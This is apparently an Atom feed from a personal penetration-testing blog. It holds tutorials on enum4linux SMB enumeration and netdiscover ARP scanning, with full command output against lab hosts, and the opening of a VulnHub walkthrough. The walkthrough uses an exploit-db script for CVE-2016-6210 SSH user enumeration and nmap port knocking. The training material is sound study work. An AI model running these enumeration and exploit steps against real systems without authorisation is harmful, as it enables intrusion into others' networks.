<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-06-19T12:53:58-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[enum4linux - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/19/enum4linux-kali-linux-tools/"/>
    <updated>2017-06-19T10:08:57-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/19/enum4linux-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: enumerate shares on a target and gather as much information as possible. enum4linux is a Perl script that can get the job done.</p>

<p>Homepage: <a href="https://labs.portcullis.co.uk/tools/enum4linux/">https://labs.portcullis.co.uk/tools/enum4linux/</a></p>

<!-- more -->


<h2>enum4linux description</h2>

<blockquote><p>A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.</p>

<p>Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar
functionality to enum.exe formerly available from www.bindview.com.</p>

<p>It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.</p>

<p>Key features:</p>

<ul>
<li><p>RID cycling (When RestrictAnonymous is set to 1 on Windows 2000)</p></li>
<li><p>User listing (When RestrictAnonymous is set to 0 on Windows 2000)</p></li>
<li><p>Listing of group membership information</p></li>
<li><p>Share enumeration</p></li>
<li><p>Detecting if host is in a workgroup or a domain</p></li>
<li><p>Identifying the remote operating system</p></li>
<li><p>Password policy retrieval (using polenum)</p></li>
</ul>
</blockquote>

<h2>enum4linux options</h2>

<p>```
num4linux
enum4linux v0.8.9 (<a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a>)
Copyright &copy; 2011 Mark Lowe (<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x6d;&#x72;&#108;&#x40;&#x70;&#x6f;&#x72;&#x74;&#99;&#117;&#108;&#x6c;&#x69;&#115;&#x2d;&#115;&#101;&#99;&#x75;&#x72;&#105;&#x74;&#121;&#46;&#99;&#111;&#x6d;">&#x6d;&#114;&#x6c;&#x40;&#112;&#x6f;&#x72;&#x74;&#99;&#117;&#108;&#x6c;&#105;&#115;&#45;&#115;&#101;&#99;&#x75;&#114;&#x69;&#x74;&#121;&#46;&#99;&#x6f;&#x6d;</a>)</p>

<p>Simple wrapper around the tools in the samba package to provide similar
functionality to enum.exe (formerly from www.bindview.com).  Some additional
features such as RID cycling have also been added for convenience.</p>

<p>Usage: ./enum4linux.pl [options] ip</p>

<p>Options are (like &ldquo;enum&rdquo;):</p>

<pre><code>-U        get userlist
-M        get machine list*
-S        get sharelist
-P        get password policy information
-G        get group and member list
-d        be detailed, applies to -U and -S
-u user   specify username to use (default "")  
-p pass   specify password to use (default "")   
</code></pre>

<p>The following options from enum.exe aren&rsquo;t implemented: -L, -N, -D, -f</p>

<p>Additional options:</p>

<pre><code>-a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
          This opion is enabled if you don't provide any other options.
-h        Display this help message and exit
-r        enumerate users via RID cycling
-R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
-K n      Keep searching RIDs until n consective RIDs don't correspond to
          a username.  Impies RID range ends at 999999. Useful 
      against DCs.
-l        Get some (limited) info via LDAP 389/TCP (for DCs only)
-s file   brute force guessing for share names
-k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
          Used to get sid with "lookupsid known_username"
          Use commas to try several users: "-k admin,user1,user2"
-o        Get OS information
-i        Get printer information
-w wrkg   Specify workgroup manually (usually found automatically)
-n        Do an nmblookup (similar to nbtstat)
-v        Verbose.  Shows full commands being run (net, rpcclient, etc.)
</code></pre>

<p>RID cycling should extract a list of users from Windows (or Samba) hosts
which have RestrictAnonymous set to 1 (Windows NT and 2000), or &ldquo;Network
access: Allow anonymous SID/Name translation&rdquo; enabled (XP, 2003).</p>

<p>NB: Samba servers often seem to have RIDs in the range 3000-3050.</p>

<p>Dependancy info: You will need to have the samba package installed as this
script is basically just a wrapper around rpcclient, net, nmblookup and
smbclient.  Polenum from <a href="http://labs.portcullis.co.uk/application/polenum/">http://labs.portcullis.co.uk/application/polenum/</a>
is required to get Password Policy info.
```</p>

<h2>enum4linux usage</h2>

<ul>
<li>get everything you can from a host without any credentials</li>
</ul>


<p>```
enum4linux 192.168.217.131
Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Jun 19 10:06:33 2017</p>

<p> ==========================
|    Target Information    |
 ==========================
Target &hellip;&hellip;&hellip;.. 192.168.217.131
RID Range &hellip;&hellip;.. 500-550,1000-1050
Username &hellip;&hellip;&hellip; &lsquo;&rsquo;
Password &hellip;&hellip;&hellip; &lsquo;&rsquo;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p>

<p> =======================================================
|    Enumerating Workgroup/Domain on 192.168.217.131    |
 =======================================================
[E] Can&rsquo;t find workgroup/domain</p>

<p> ===============================================
|    Nbtstat Information for 192.168.217.131    |
 ===============================================
Looking up status of 192.168.217.131
No reply from 192.168.217.131</p>

<p> ========================================
|    Session Check on 192.168.217.131    |
 ========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 192.168.217.131 allows sessions using username &lsquo;&rsquo;, password &lsquo;&rsquo;
[+] Got domain/workgroup name: SAMBA</p>

<p> ==============================================
|    Getting domain SID for 192.168.217.131    |
 ==============================================
Domain Name: SAMBA
Domain Sid: (NULL SID)
[+] Can&rsquo;t determine if host is part of domain or part of a workgroup</p>

<p> =========================================
|    OS information on 192.168.217.131    |
 =========================================
[+] Got OS info for 192.168.217.131 from smbclient: Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
[+] Got OS info for 192.168.217.131 from srvinfo:</p>

<pre><code>LOCALHOST      Wk Sv PrQ Unx NT SNT Samba File Server
platform_id     :   500
os version      :   6.1
server type     :   0x809a03
</code></pre>

<p> ================================
|    Users on 192.168.217.131    |
 ================================
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smbuser  Name: Samba access is allowed for this user Desc:</p>

<p>user:[smbuser] rid:[0x3e8]</p>

<p> ============================================
|    Share Enumeration on 192.168.217.131    |
 ============================================
WARNING: The &ldquo;syslog&rdquo; option is deprecated
Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]</p>

<pre><code>Sharename       Type      Comment
---------       ----      -------
sharename       Disk      Only authorized users
IPC$            IPC       IPC Service (Samba File Server)

Server               Comment
---------            -------

Workgroup            Master
---------            -------
</code></pre>

<p>[+] Attempting to map shares on 192.168.217.131
//192.168.217.131/sharename Mapping: DENIED, Listing: N/A
//192.168.217.131/IPC$  Mapping: OK Listing: DENIED</p>

<p> =======================================================
|    Password Policy Information for 192.168.217.131    |
 =======================================================
[E] Unexpected error from polenum:
Traceback (most recent call last):
  File &ldquo;/usr/bin/polenum&rdquo;, line 33, in <module></p>

<pre><code>from impacket.dcerpc import dcerpc_v4, dcerpc, transport, samr
</code></pre>

<p>ImportError: cannot import name dcerpc_v4
[+] Retieved partial password policy with rpcclient:</p>

<p>Password Complexity: Disabled
Minimum Password Length: 5</p>

<p> =================================
|    Groups on 192.168.217.131    |
 =================================</p>

<p>[+] Getting builtin groups:</p>

<p>[+] Getting builtin group memberships:</p>

<p>[+] Getting local groups:</p>

<p>[+] Getting local group memberships:</p>

<p>[+] Getting domain groups:</p>

<p>[+] Getting domain group memberships:</p>

<p> ==========================================================================
|    Users on 192.168.217.131 via RID cycling (RIDS: 500-550,1000-1050)    |
 ==========================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3832469351-2479326917-463392201
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-3832469351-2479326917-463392201 and logon username &lsquo;&rsquo;, password &lsquo;&rsquo;
S-1-5-21-3832469351-2479326917-463392201-500 <em>unknown</em>*unknown<em> (8)
S-1-5-21-3832469351-2479326917-463392201-501 LOCALHOST\nobody (Local User)
[&hellip;]
S-1-5-21-3832469351-2479326917-463392201-513 LOCALHOST\None (Domain Group)
S-1-5-21-3832469351-2479326917-463392201-1000 LOCALHOST\smbuser (Local User)
[+] Enumerating users using SID S-1-22-1 and logon username &lsquo;&rsquo;, password &lsquo;&rsquo;
S-1-22-1-1000 Unix User\nixhat (Local User)
S-1-22-1-1001 Unix User\smbuser (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username &lsquo;&rsquo;, password &lsquo;&rsquo;
S-1-5-32-500 </em>unknown<em>*unknown</em> (8)
[&hellip;]
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)</p>

<p> ================================================
|    Getting printer info for 192.168.217.131    |
 ================================================
No printers returned.</p>

<p>enum4linux complete on Mon Jun 19 10:07:15 2017
```</p>

<p>I edited some not found output for sanity, but you can see that even without any previous information, we were able to gather quite a few pieces, like the workgroup name, the server version, and the existing shares and users</p>

<ul>
<li>perform some enumeration while also showing the commands being run</li>
</ul>


<p>```
enum4linux -n -v 192.168.217.140
[V] Dependent program &ldquo;nmblookup&rdquo; found in /usr/bin/nmblookup
[V] Dependent program &ldquo;net&rdquo; found in /usr/bin/net
[V] Dependent program &ldquo;rpcclient&rdquo; found in /usr/bin/rpcclient
[V] Dependent program &ldquo;smbclient&rdquo; found in /usr/bin/smbclient
[V] Dependent program &ldquo;polenum&rdquo; found in /usr/bin/polenum
[V] Dependent program &ldquo;ldapsearch&rdquo; found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Jun 19 10:50:48 2017</p>

<p> ==========================
|    Target Information    |
 ==========================
Target &hellip;&hellip;&hellip;.. 192.168.217.140
RID Range &hellip;&hellip;.. 500-550,1000-1050
Username &hellip;&hellip;&hellip; &lsquo;&rsquo;
Password &hellip;&hellip;&hellip; &lsquo;&rsquo;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p>

<p> =======================================================
|    Enumerating Workgroup/Domain on 192.168.217.140    |
 =======================================================
[V] Attempting to get domain name with command: nmblookup -A &lsquo;192.168.217.140&rsquo;
[+] Got domain/workgroup name: WORKGROUP</p>

<p> ===============================================
|    Nbtstat Information for 192.168.217.140    |
 ===============================================
Looking up status of 192.168.217.140</p>

<pre><code>WIN-D7GA2J1M0TU &lt;00&gt; -         M &lt;ACTIVE&gt;  Workstation Service
WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Domain/Workgroup Name
WIN-D7GA2J1M0TU &lt;20&gt; -         M &lt;ACTIVE&gt;  File Server Service
WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Browser Service Elections
WORKGROUP       &lt;1d&gt; -         M &lt;ACTIVE&gt;  Master Browser
..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Master Browser

MAC Address = 00-0C-29-5C-13-CA
</code></pre>

<p> ========================================
|    Session Check on 192.168.217.140    |
 ========================================
[V] Attempting to make null session using command: smbclient -W &lsquo;WORKGROUP&rsquo; //&lsquo;192.168.217.140&rsquo;/ipc$ -U'&lsquo;%&rsquo;&lsquo; -c 'help&rsquo; 2>&amp;1
[+] Server 192.168.217.140 allows sessions using username &lsquo;&rsquo;, password &lsquo;&rsquo;</p>

<p> ==============================================
|    Getting domain SID for 192.168.217.140    |
 ==============================================
[V] Attempting to get domain SID with command: rpcclient -W &lsquo;WORKGROUP&rsquo; -U'&lsquo;%&rsquo;&lsquo; 192.168.217.140 -c 'lsaquery&rsquo; 2>&amp;1
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED
[+] Can&rsquo;t determine if host is part of domain or part of a workgroup
enum4linux complete on Mon Jun 19 10:50:48 2017
```</p>

<ul>
<li>get OS information</li>
</ul>


<p><code>
enum4linux -o 192.168.217.140
[...]
 =========================================
|    OS information on 192.168.217.140    |
 =========================================
[+] Got OS info for 192.168.217.140 from smbclient: Domain=[WIN-D7GA2J1M0TU] OS=[Windows 7 Ultimate 7601 Service Pack 1] Server=[Windows 7 Ultimate 6.1]
[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED
</code></p>

<ul>
<li>list shares on a server with credentials</li>
</ul>


<p>```
enum4linux -u Administrator -p Password123! -S 192.168.217.141
Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Mon Jun 19 12:40:55 2017</p>

<p> ==========================
|    Target Information    |
 ==========================
Target &hellip;&hellip;&hellip;.. 192.168.217.141
RID Range &hellip;&hellip;.. 500-550,1000-1050
Username &hellip;&hellip;&hellip; &lsquo;Administrator&rsquo;
Password &hellip;&hellip;&hellip; &lsquo;Password123!&rsquo;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p>

<p> =======================================================
|    Enumerating Workgroup/Domain on 192.168.217.141    |
 =======================================================
[+] Got domain/workgroup name: SANGHELIOS0</p>

<p> ========================================
|    Session Check on 192.168.217.141    |
 ========================================
[+] Server 192.168.217.141 allows sessions using username &lsquo;Administrator&rsquo;, password &lsquo;Password123!&rsquo;</p>

<p> ==============================================
|    Getting domain SID for 192.168.217.141    |
 ==============================================
Domain Name: SANGHELIOS0
Domain Sid: S-1-5-21-1024350911-1337957381-1412282408
[+] Host is part of a domain (not a workgroup)</p>

<p> ============================================
|    Share Enumeration on 192.168.217.141    |
 ============================================
WARNING: The &ldquo;syslog&rdquo; option is deprecated
Domain=[SANGHELIOS0] OS=[Windows Server 2012 Datacenter 9200] Server=[Windows Server 2012 Datacenter 6.2]</p>

<pre><code>Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
ops             Disk      
SYSVOL          Disk      Logon server share 
testshare       Disk      A share on Windows Server
</code></pre>

<p>Connection to 192.168.217.141 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
NetBIOS over TCP disabled &mdash; no workgroup available</p>

<p>[+] Attempting to map shares on 192.168.217.141
//192.168.217.141/ADMIN$    Mapping: OK, Listing: OK
//192.168.217.141/C$    [E] Can&rsquo;t understand response:
WARNING: The &ldquo;syslog&rdquo; option is deprecated
Domain=[SANGHELIOS0] OS=[Windows Server 2012 Datacenter 9200] Server=[Windows Server 2012 Datacenter 6.2]
  $Recycle.Bin                      DHS        0  Thu Jul 26 03:38:59 2012
  Boot                              DHS        0  Sun Oct 16 18:44:49 2016
  bootmgr                          AHSR   398156  Wed Jul 25 23:44:30 2012
  BOOTNXT                           AHS        1  Sat Jun  2 10:30:55 2012
  BOOTSECT.BAK                     AHSR     8192  Sun Oct 16 18:44:50 2016
  Documents and Settings            DHS        0  Thu Jul 26 03:14:09 2012
  pagefile.sys                      AHS 402653184  Mon Jun 19 12:08:41 2017
  PerfLogs                            D        0  Thu Jul 26 03:44:15 2012
  Program Files                      DR        0  Sun Oct 16 07:53:13 2016
  Program Files (x86)                 D        0  Thu Jul 26 04:04:58 2012
  ProgramData                        DH        0  Sun Oct 23 08:55:39 2016
  Recovery                          DHS        0  Sun Oct 16 07:48:22 2016
  StorageReports                      D        0  Sat Oct 22 17:17:58 2016
  System Volume Information         DHS        0  Sat Oct 22 17:17:27 2016
  testshare                           D        0  Mon Jun 19 12:25:50 2017
  Users                              DR        0  Sat Oct 22 16:06:28 2016
  Windows                             D        0  Sat Oct 22 16:49:16 2016</p>

<pre><code>    7863807 blocks of size 4096. 5348507 blocks available
</code></pre>

<p>//192.168.217.141/IPC$  Mapping: OK Listing: DENIED
//192.168.217.141/NETLOGON  Mapping: OK, Listing: OK
//192.168.217.141/ops   Mapping: OK, Listing: OK
//192.168.217.141/SYSVOL    Mapping: OK, Listing: OK
//192.168.217.141/testshare Mapping: OK, Listing: OK
```</p>

<p>Once you&rsquo;re on the same network as your target, enum4linux is a great resource to help in gathering information about the target, that you can later use for an attack.</p>

<p>```</p>

<hr />

<p>/ Your lucky number is 3552664958674928. \
\ Watch for it everywhere.               /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Netdiscover - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/16/netdiscover-kali-linux-tools/"/>
    <updated>2017-06-16T13:05:44-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/16/netdiscover-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: a tool that can be used to perform ARP reconaissance and discover hosts on the local network. You could do that with Nmap too, but here netdiscover shines!</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/alexxy/netdiscover">https://github.com/alexxy/netdiscover</a></p>

<h2>Netdiscover description</h2>

<blockquote><p>netdiscover is an  active/passive  arp  reconnaissance  tool,  initialy
developed  to  gain  information  about  wireless networks without dhcp
servers in wardriving scenarios.  It  can  also  be  used  on  switched
networks.  Built  on top of libnet and libpcap, it can passively detect
online hosts or search for them by sending arp requests.</p>

<p>Furthermore, it can be used to inspect your network&rsquo;s arp  traffic,  or
find network addresses using auto scan mode, which will scan for common
local networks.</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/precise/man8/netdiscover.8.html">http://manpages.ubuntu.com/manpages/precise/man8/netdiscover.8.html</a></p>

<h2>Netdiscover options</h2>

<p>```
Netdiscover 0.3-pre-beta7 [Active/passive arp reconnaissance tool]
Written by: Jaime Penalba <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#106;&#x70;&#101;&#110;&#97;&#108;&#98;&#97;&#x65;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#x6a;&#x70;&#101;&#x6e;&#97;&#108;&#x62;&#x61;&#101;&#64;&#x67;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a></p>

<p>Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-s time] [-n node] [-c count] [-f] [-d] [-S] [-P] [-c]
  -i device: your network device
  -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8
  -l file: scan the list of ranges contained into the given file
  -p passive mode: do not send anything, only sniff
  -m file: scan the list of known MACs and host names
  -F filter: Customize pcap filter expression (default: &ldquo;arp&rdquo;)
  -s time: time to sleep between each arp request (milliseconds)
  -n node: last ip octet used for scanning (from 2 to 253)
  -c count: number of times to send each arp reques (for nets with packet loss)
  -f enable fastmode scan, saves a lot of time, recommended for auto
  -d ignore home config files for autoscan and fast mode
  -S enable sleep time supression between each request (hardcore mode)
  -P print results in a format suitable for parsing by another program
  -N Do not print header. Only valid when -P is enabled.
  -L in parsable output mode (-P), continue listening after the active scan is completed</p>

<p>If -r, -l or -p are not enabled, netdiscover will scan for common lan addresses.
```</p>

<h2>Netdiscover usage</h2>

<p>Simply typing netdiscover at the terminal will launch its autoscan. The screen is interactive, and you can see new hosts as they appear.</p>

<ul>
<li>scan range</li>
</ul>


<p>```
netdiscover -r 192.168.217.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts</p>

<p> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor                                                                                 <br/>
 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor                                                                                 <br/>
 192.168.217.254 00:50:56:f2:e2:e6      1      60  Unknown vendor   <br/>
```</p>

<ul>
<li>passive scan (don&rsquo;t send anything, just sniff)</li>
</ul>


<p>```
netdiscover -p
 Currently scanning: (passive)   |   Screen View: Unique Hosts</p>

<p> 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor                                                                                 <br/>
 192.168.217.138 00:0c:29:43:d4:3e      1      60  Unknown vendor    <br/>
```</p>

<p>This takes longer, because netdiscover is waiting to see the ARP requests and replies between other hosts</p>

<ul>
<li>fast scan</li>
</ul>


<blockquote><p>-f     Enable  fast  mode  scan. This will only scan for .1, .100 and .254 on each network. This mode is useful while
searching for ranges being used. After you found such range you can make a specific range scan to find online boxes.</p></blockquote>

<ul>
<li>produce parseable output and stop after scanning</li>
</ul>


<p>```
root@kali:~# netdiscover -r 192.168.217.0/24 -P</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor
 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor
 192.168.217.138 00:0c:29:43:d4:3e      1      60  Unknown vendor
 192.168.217.254 00:50:56:f2:e2:e6      1      60  Unknown vendor</p>

<p>&mdash; Active scan completed, 4 Hosts found.
```</p>

<p>Cookie:</p>

<p>```</p>

<hr />

<p>/ F.S. Fitzgerald to Hemingway:        \
|                                      |
| &ldquo;Ernest, the rich are different from |
| us.&rdquo; Hemingway:                      |
|                                      |
\ &ldquo;Yes. They have more money.&rdquo;         /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Bow before the Lord of the Root]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root/"/>
    <updated>2017-06-12T11:08:37-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root</id>
    <content type="html"><![CDATA[<p>Back to looking through VulnHub&rsquo;s selection of virtual machines, I got hooked by the name of this one. The author intended for this machine to be similar in difficulty to those in the OSCP lab, so it&rsquo;s definitely good training if you&rsquo;re preparing to jump into the fray!</p>

<!-- more -->


<p>The port scan revealed only 1 open port:</p>

<p><code>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
</code></p>

<p>I also ran a UDP scan, but got nothing. I proceeded to google the SSH version, and got a hit quite fast. It appears that this OpenSSH version is vulnerable to <a href="https://www.ubuntu.com/usn/usn-3061-1/">CVE-2016-6210</a>, which allows users to be enumerated.</p>

<p>Luckily for us, there is an <a href="https://www.exploit-db.com/exploits/40136/">exploit</a> available.</p>

<p>```
python 40136.py -h
usage: 40136.py [-h] [-u USER | -U USERLIST] [-e] [-s] [&mdash;bytes BYTES]</p>

<pre><code>            [--samples SAMPLES] [--factor FACTOR] [--trials TRIALS]
            host
</code></pre>

<p>positional arguments:
  host                  Give SSH server address like ip:port or just by ip</p>

<p>optional arguments:
  -h, &mdash;help            show this help message and exit
  -u USER, &mdash;user USER  Give a single user name
  -U USERLIST, &mdash;userlist USERLIST</p>

<pre><code>                    Give a file containing a list of users
</code></pre>

<p>  -e, &mdash;enumerated      Only show enumerated users
  -s, &mdash;silent          Like -e, but just the user names will be written to</p>

<pre><code>                    stdout (no banner, no anything)
</code></pre>

<p>  &mdash;bytes BYTES         Send so many BYTES to the SSH daemon as a password
  &mdash;samples SAMPLES     Collect so many SAMPLES to calculate a timing baseline</p>

<pre><code>                    for authenticating non-existing users
</code></pre>

<p>  &mdash;factor FACTOR       Used to compute the upper timing boundary for user</p>

<pre><code>                    enumeration
</code></pre>

<p>  &mdash;trials TRIALS       try to authenticate user X for TRIALS times and</p>

<pre><code>                    compare the mean of auth timings against the timing
                    boundary
</code></pre>

<p>```</p>

<p>So you have to give the script a username or a list of users to enumerate. Well, we already know one user! If you glanced at the LordOfTheRoot VM after it booted, you probably noticed good old smeagol:</p>

<p><img class="center" src="/images/pentest/lordoftheroot/smeagol.png" title="&lsquo;smeagol&rsquo; &lsquo;smeagol&rsquo;" ></p>

<p>Ran the script with the smeagol username:</p>

<p>```
python 40136.py -u smeagol 192.168.217.136</p>

<p>User name enumeration against SSH daemons affected by CVE-2016-6210
Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari</p>

<p>[<em>] Testing SSHD at: 192.168.217.136:22, Banner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3
[</em>] Getting baseline timing for authenticating non-existing users&hellip;&hellip;&hellip;&hellip;
[<em>] Baseline mean for host 192.168.217.136 is 0.0507569 seconds.
[</em>] Baseline variation for host 192.168.217.136 is 0.0110011491622 seconds.
[<em>] Defining timing of x &lt; 0.0837603474867 as non-existing user.
[</em>] Testing your users&hellip;
[+] smeagol &ndash; timing: 0.425467
```</p>

<p>We know there is a smeagol user on the box, but couldn&rsquo;t find any other exploit that might help in this situation. So I just tried SSH'ing into the box to see what happens:</p>

<p>```
ssh <a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#115;&#109;&#x65;&#x61;&#103;&#111;&#108;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#x32;&#49;&#55;&#46;&#x31;&#x33;&#x36;">&#115;&#109;&#101;&#x61;&#x67;&#111;&#108;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x32;&#49;&#x37;&#46;&#x31;&#x33;&#x36;</a>
The authenticity of host &lsquo;192.168.217.136 (192.168.217.136)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;192.168.217.136&rsquo; (ECDSA) to the list of known hosts.</p>

<pre><code>                                              .____    _____________________________
                                              |    |   \_____  \__    ___/\______   \
                                              |    |    /   |   \|    |    |       _/
                                              |    |___/    |    \    |    |    |   \
                                              |_______ \_______  /____|    |____|_  /
                                                      \/       \/                 \/
</code></pre>

<p> <em><em><strong>  </strong>.                     <strong>     </strong></em></em><strong><em><strong><strong>      .</strong>                   .</strong></em> </strong><strong><strong><strong><strong><em>      </em></strong></strong></strong></strong><strong>       </strong>
|    |/ <em>| </em><em><strong>   </strong><strong>   </strong></em><em> |  | <strong> _   </strong></em><strong>/</strong><em><em><strong>|</strong>| </em></em><strong>   </strong><strong>    </strong>| <em>/ _</em>    <strong><em>/</em></strong>   _   <strong><strong><em>/ </em></strong></strong>/  |<em>  </em><em><strong><strong><strong><strong><em>
|      &lt;  /    \ /  _ _/ </em></strong>\|  |/ /  |    </strong>) _  </strong> \  |/ </strong> \ /    \  / <strong> |    |    | /  _ \   |    </strong>)</em> /    \   <strong>\/ </strong> _  <strong> \
|    |  \|   |  (  &lt;_> )  _</strong>|    &lt;   |     \   |  | \/  \  <strong><em>/|   |  \/ /</em>/ |    |    |(  &lt;<em>> )  |        \   |  \  | \  </em></strong>/|  | \/
|<em><em><strong>|</strong> _<strong>|  /_</strong></em>/ _<strong>  ></strong>|</em> \  _<strong>  /   |</strong>|  |<strong>|_</strong>  ><strong><em>|  /_</em></strong> |    |<em><strong><em>| _</em></strong>/  /</em><strong><strong><em>_  /</em></strong>|  /</strong>|  _<strong>  ></strong>|</p>

<pre><code>    \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
</code></pre>

<p>Easy as 1,2,3
<a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x73;&#109;&#101;&#x61;&#x67;&#x6f;&#x6c;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x32;&#49;&#55;&#46;&#49;&#x33;&#54;">&#x73;&#x6d;&#x65;&#97;&#103;&#111;&#108;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#50;&#49;&#x37;&#x2e;&#49;&#51;&#54;</a>&rsquo;s password:
```</p>

<p>Woot, a banner with a hint! The knock part might reference port knocking, as I&rsquo;ve seen that in some previous challenges. And the ports seem to be mentioned already! I used Nmap to knock on ports 1,2 and 3:</p>

<p>```
nmap -r -p1,2,3 192.168.217.136</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-06-12 12:31 EDT
Nmap scan report for 192.168.217.136
Host is up (0.00065s latency).
PORT  STATE    SERVICE
1/tcp filtered tcpmux
2/tcp filtered compressnet
3/tcp filtered compressnet
```</p>

<p>The <code>-r</code> option was necessary to scan the ports in consecutive order. After knocking, I ran the full Nmap scan again, and a web server now awaited me:</p>

<p><code>
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
</code></p>

